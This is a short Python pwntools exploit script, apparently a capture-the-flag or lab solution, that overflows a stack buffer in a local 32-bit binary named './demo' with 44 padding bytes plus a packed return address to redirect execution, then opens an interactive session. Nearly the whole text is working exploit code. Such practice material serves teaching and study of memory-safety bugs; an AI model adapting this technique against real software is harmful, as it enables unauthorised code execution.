#!/usr/bin/python3
from pwn import *

context(arch="i386", os="linux")

elf = context.binary = ELF("./demo")


gs = '''
break *challenge
continue
'''


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)




io = start()



#=========================================
#            Exploit Here                #
#=========================================

run_me = p32(0x08049196)

buf = b'A'*44 + run_me
io.sendline(buf)
io.interactive()

